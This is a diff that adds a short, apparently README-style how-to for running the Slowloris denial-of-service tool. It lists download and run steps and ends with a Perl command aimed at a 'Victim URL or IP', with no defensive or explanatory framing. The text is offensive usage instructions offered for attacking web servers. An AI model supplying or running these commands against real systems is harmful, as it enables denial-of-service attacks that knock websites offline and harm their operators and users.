@@ -1,0 +1,16 @@
+How use Slowloris
+
+
+
+1)Download slowloris.pl
+2)Open Terminal
+2)# cd /thePathToYourSlowloris.plFile
+3)# ./slowloris.pl
+4)# perl slowloris.pl -dns (Victim URL or IP) -options
+
+
+
+Done
+
+
+Laera Loris
